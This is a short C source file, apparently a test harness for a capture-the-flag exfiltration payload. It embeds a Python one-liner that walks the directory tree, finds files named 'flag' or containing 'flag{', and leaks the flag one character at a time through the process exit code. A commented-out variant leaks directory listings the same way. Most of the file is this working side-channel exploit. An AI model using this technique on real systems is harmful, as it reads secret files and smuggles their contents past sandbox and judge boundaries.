#include <stdio.h>
#include <stdlib.h>

void main(){  //C script used to check exfiltration code's syntax errors
                //and functionality
    
    char * command;
    //command = "\exit $(printf '%d' \"'$(printf %.1s \"$(echo *)\")'\")";
    
    command = "python -c \"exec(\'import os\\nimport sys\\ncounter = 0\\nfor (dirpath, dirnames, filenames) in os.walk(\\\'.\\\'):\\n\\tfor fname in filenames:\\n\\t\\tif \\\'flag\\\' in fname:\\n\\t\\t\\n\\t\\t\\texit(55)\\n\\t\\ttry:\\n\\t\\t\\twith open(os.path.join(dirpath, fname), \\\'r\\\') as f:\\n\\t\\t\\t\\tfbody = f.read()\\n\\t\\t\\t\\tif \\\'flag{\\\' in fbody:\\n\\t\\t\\t\\t\\texit(ord(fbody[fbody.index(\\\'flag{\\\') + 5:][counter]))\\n\\t\\texcept IOError:\\n\\t\\t\\tpass\\nexit(50)\')\"";
    
    printf("%s\\n",command);
    printf("%d \\n",system(command)>>8); //Left Shift To Emulate Shift from the Binary
}
